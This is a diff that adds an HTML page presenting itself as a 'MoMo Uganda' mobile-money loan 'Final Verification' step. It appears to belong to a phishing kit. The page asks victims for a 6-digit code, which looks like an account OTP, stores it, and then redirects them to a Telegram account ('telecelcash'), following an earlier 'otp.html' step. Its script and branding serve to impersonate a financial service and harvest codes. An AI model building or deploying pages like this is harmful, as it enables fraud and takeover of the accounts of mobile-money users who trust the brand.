@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>Final Verification - MoMo Uganda</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: #f3f4f6;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+        .container {
+            width: 100%;
+            max-width: 420px;
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        .logo-section {
+            background: linear-gradient(135deg, #E42320 0%, #c01c1a 100%);
+            text-align: center;
+            padding: 28px 0 22px;
+        }
+        .brand-logo {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo-icon {
+            width: 48px;
+            height: 48px;
+            background: white;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .brand-name {
+            color: white;
+            font-size: 26px;
+            font-weight: 700;
+        }
+        .tagline {
+            color: rgba(255,255,255,0.85);
+            font-size: 12.5px;
+        }
+        h1 {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            color: #1e2937;
+            margin: 22px 0 6px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #475569;
+            font-size: 14px;
+            padding: 0 25px 18px;
+        }
+        .offer-info {
+            background: #fff0f0;
+            margin: 0 20px 18px;
+            padding: 15px;
+            border-radius: 16px;
+            text-align: center;
+        }
+        .offer-amount {
+            color: #E42320;
+            font-weight: 800;
+            font-size: 24px;
+        }
+        .code-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 18px 0 26px;
+            padding: 0 20px;
+            flex-wrap: wrap;
+        }
+        .code-input {
+            width: 52px;
+            height: 62px;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 700;
+            color: #E42320;
+            border: 2px solid #e2e8f0;
+            border-radius: 14px;
+            outline: none;
+            background: white;
+        }
+        .code-input:focus {
+            border-color: #E42320;
+            box-shadow: 0 0 0 4px rgba(228,35,32,0.15);
+        }
+        .btn-action {
+            width: 100%;
+            background: #E42320;
+            color: white;
+            border: none;
+            padding: 17px;
+            font-size: 17px;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        .back-btn {
+            width: 100%;
+            background: transparent;
+            color: #64748b;
+            border: 2px solid #e2e8f0;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+        }
+        #spinner {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.9);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .spin-ring {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(255,255,255,0.2);
+            border-top-color: #E42320;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo-section">
+        <div class="brand-logo">
+            <div class="logo-icon">
+                <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
+                    <rect x="3" y="12" width="22" height="14" rx="3" fill="#E42320"/>
+                    <path d="M8 12V9C8 6.24 10.24 4 13 4H15C17.76 4 20 6.24 20 9V12" stroke="white" stroke-width="2.2" fill="none"/>
+                    <circle cx="14" cy="19" r="2.5" fill="white"/>
+                </svg>
+            </div>
+            <div>
+                <div class="brand-name">MoMo Uganda</div>
+                <div class="tagline">Mobile Money • Loans</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="content-wrapper">
+        <h1>Final Verification</h1>
+        <p class="subtitle">Enter the 6-digit verification code</p>
+
+        <div class="offer-info">
+            <div class="offer-amount" id="offerAmount">—</div>
+            <div id="offerDetails" style="font-size:12px; color:#64748b; margin-top:5px;"></div>
+        </div>
+
+        <div class="code-container" id="codeInputs"></div>
+
+        <div style="padding: 0 25px 30px;">
+            <button class="btn-action" id="verifyBtn">Verify & Complete →</button>
+            <button class="back-btn" onclick="window.location.href='otp.html'">← Back</button>
+        </div>
+    </div>
+</div>
+
+<div id="spinner">
+    <div class="spin-ring"></div>
+    <p style="color:white;">Verifying...</p>
+</div>
+
+<script>
+    const TELEGRAM_USERNAME = 'telecelcash';
+    const TELEGRAM_LINK = `https://t.me/${TELEGRAM_USERNAME}`;
+
+    function loadLoanData() {
+        const calculatorData = sessionStorage.getItem('calculatorData');
+        if (calculatorData) {
+            const data = JSON.parse(calculatorData);
+            document.getElementById('offerAmount').textContent = `UGX ${data.amount.toLocaleString()}`;
+            const months = data.duration / 30;
+            document.getElementById('offerDetails').textContent = `${months} Month${months > 1 ? 's' : ''} • Monthly: UGX ${data.monthly.toLocaleString()}`;
+        }
+    }
+
+    function createInputs() {
+        const container = document.getElementById('codeInputs');
+        container.innerHTML = '';
+        for (let i = 0; i < 6; i++) {
+            const input = document.createElement('input');
+            input.type = 'text';
+            input.maxLength = 1;
+            input.className = 'code-input';
+            input.inputMode = 'numeric';
+            container.appendChild(input);
+        }
+    }
+
+    function getCode() {
+        return Array.from(document.querySelectorAll('.code-input')).map(i => i.value.trim()).join('');
+    }
+
+    function setupAutoFocus() {
+        const inputs = document.querySelectorAll('.code-input');
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                input.value = input.value.replace(/\D/g, '');
+                if (input.value.length === 1 && index < 5) {
+                    inputs[index + 1].focus();
+                }
+                if (getCode().length === 6) {
+                    setTimeout(goToTelegram, 200);
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !input.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+    }
+
+    function goToTelegram() {
+        const code = getCode();
+        if (code.length !== 6) {
+            return;
+        }
+        
+        const btn = document.getElementById('verifyBtn');
+        btn.disabled = true;
+        btn.textContent = "Processing...";
+        document.getElementById('spinner').style.display = 'flex';
+        
+        // Save the final code
+        sessionStorage.setItem('finalCode', code);
+        
+        // Redirect to Telegram
+        setTimeout(() => {
+            window.location.href = TELEGRAM_LINK;
+        }, 1000);
+    }
+
+    document.getElementById('verifyBtn').onclick = goToTelegram;
+    
+    createInputs();
+    setupAutoFocus();
+    loadLoanData();
+    document.querySelectorAll('.code-input')[0]?.focus();
+</script>
+</body>
+</html>
